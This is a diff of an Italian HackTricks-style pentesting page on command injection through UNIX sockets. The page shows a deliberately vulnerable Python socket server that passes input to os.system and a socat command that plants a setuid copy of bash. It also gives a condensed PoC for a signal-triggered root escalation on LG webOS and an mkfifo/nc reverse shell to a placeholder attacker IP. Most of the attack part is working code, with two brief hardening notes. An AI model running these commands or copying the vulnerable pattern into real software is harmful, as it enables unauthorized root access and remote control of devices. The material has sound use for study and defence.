@@ -1,8 +1,10 @@
 # Socket Command Injection
 
+{{#include ../../banners/hacktricks-training.md}}
+
 ## Esempio di socket binding con Python
 
-Nel seguente esempio viene **creato un unix socket** (`/tmp/socket_test.s`) e tutto ciò che viene **ricevuto** verrà **eseguito** da `os.system`. So che non troverai una situazione simile in the wild, ma l'obiettivo di questo esempio è vedere come appare il codice che utilizza i unix socket e come gestire l'input nel peggiore dei casi.
+Nel seguente esempio viene **creato un unix socket** (`/tmp/socket_test.s`) e tutto ciò che viene **ricevuto** sarà **eseguito** da `os.system`. So che non troverai una situazione simile in the wild, ma l'obiettivo di questo esempio è vedere come appare il codice che utilizza unix socket e come gestire l'input nel peggior caso possibile.
 ```python:s.py
 import socket
 import os, os.path
@@ -24,7 +26,7 @@ print(datagram)
 os.system(datagram)
 conn.close()
 ```
-**Esegui** il codice usando python: `python s.py` e **controlla come è in ascolto il socket**:
+**Esegui** il codice usando python: `python s.py` e **controlla come il socket è in ascolto**:
 ```python
 netstat -a -p --unix | grep "socket_test"
 (Not all processes could be identified, non-owned process info
@@ -35,19 +37,19 @@ unix  2      [ ACC ]     STREAM     LISTENING     901181   132748/python        
 ```python
 echo "cp /bin/bash /tmp/bash; chmod +s /tmp/bash; chmod +x /tmp/bash;" | socat - UNIX-CLIENT:/tmp/socket_test.s
 ```
-## Caso di studio: escalation attivata da un segnale su un socket UNIX di proprietà di root (LG webOS)
+## Caso di studio: escalation attivata da un segnale tramite socket UNIX di proprietà di root (LG webOS)
 
-Alcuni daemon privilegiati espongono un socket UNIX di proprietà di root che accetta input non attendibili e associa azioni privilegiate a thread-ID e segnali. Se il protocollo consente a un client non privilegiato di influenzare quale thread nativo viene preso di mira, potrebbe essere possibile attivare un percorso di codice privilegiato ed effettuare un'escalation.<sup>[[1]](#references)[[2]](#references)</sup>
+Alcuni daemon privilegiati espongono un socket UNIX di proprietà di root che accetta input non attendibile e associa azioni privilegiate a thread-ID e segnali. Se il protocollo consente a un client senza privilegi di influenzare quale thread nativo venga preso di mira, potrebbe essere possibile attivare un percorso di codice privilegiato ed eseguire un'escalation.<sup>[[1]](#references)[[2]](#references)</sup>
 
-Il write-up principale e la disclosure descrivono la seguente sequenza.<sup>[[1]](#references)[[2]](#references)</sup>
+La write-up principale e la disclosure descrivono la seguente sequenza.<sup>[[1]](#references)[[2]](#references)</sup>
 
 Pattern osservato:
-- Connettersi a un socket di proprietà di root (ad es., /tmp/remotelogger).
-- Creare un thread e ottenere il suo thread id (TID) nativo.
-- Inviare il TID (packed) più padding come richiesta; ricevere un acknowledgement.
+- Connettersi a un socket di proprietà di root (ad es. /tmp/remotelogger).
+- Creare un thread e ottenere il suo thread id nativo (TID).
+- Inviare il TID (in formato packed) insieme al padding come richiesta; ricevere un acknowledgement.
 - Inviare un segnale specifico a quel TID per attivare il comportamento privilegiato.
 
-Il PoC condensato qui sotto riproduce tale sequenza.<sup>[[1]](#references)[[2]](#references)</sup>
+Il PoC condensato riportato di seguito rispecchia questa sequenza.<sup>[[1]](#references)[[2]](#references)</sup>
 Schema di PoC minimale:
 ```python
 import socket, struct, os, threading, time
@@ -60,16 +62,17 @@ s.sendall(struct.pack('<L', tid) + b'A'*0x80)
 s.recv(4)  # sync
 os.kill(tid, 4)  # deliver SIGILL (example from the case)
 ```
-Per trasformare questo in una root shell, si può usare un semplice pattern named-pipe + nc.<sup>[[2]](#references)</sup>
+Per trasformarlo in una shell root, si può usare un semplice pattern named-pipe + nc.<sup>[[2]](#references)</sup>
 ```bash
 rm -f /tmp/f; mkfifo /tmp/f
 cat /tmp/f | /bin/sh -i 2>&1 | nc <ATTACKER-IP> 23231 > /tmp/f
 ```
-- Questa classe di bug deriva dall'affidarsi a valori derivati dallo stato del client non privilegiato (TID) e dal associarli a signal handler o logiche privilegiati.<sup>[[1]](#references)</sup>
-- Rafforzare la sicurezza imponendo le credenziali sul socket, convalidando i formati dei messaggi e disaccoppiando le operazioni privilegiate dagli identificatori dei thread forniti esternamente.
+Note:
+- Questa classe di bug deriva dall'affidarsi a valori ottenuti dallo stato del client non privilegiato (TID) e dal associarli a signal handler o logica privilegiati.<sup>[[1]](#references)</sup>
+- Rafforzare la sicurezza imponendo le credenziali sul socket, validando i formati dei messaggi e disaccoppiando le operazioni privilegiate dagli identificatori dei thread forniti esternamente.
 
 ## References
 
-- [1] [Jailbreak webOS per divertimento (solo per divertimento)](https://ut.buglloc.com/2025/01/webos-jailbreak/)
-- [2] [Path Traversal, Authentication Bypass e presa di controllo completa del dispositivo su LG WebOS TV (SSD Disclosure)](https://ssd-disclosure.com/lg-webos-tv-path-traversal-authentication-bypass-and-full-device-takeover/)
+- [1] [Jailbreak di webOS per divertimento (solo per divertimento)](https://ut.buglloc.com/2025/01/webos-jailbreak/)
+- [2] [Path Traversal, Authentication Bypass e controllo completo del dispositivo su LG WebOS TV (SSD Disclosure)](https://ssd-disclosure.com/lg-webos-tv-path-traversal-authentication-bypass-and-full-device-takeover/)
 {{#include ../../banners/hacktricks-training.md}}
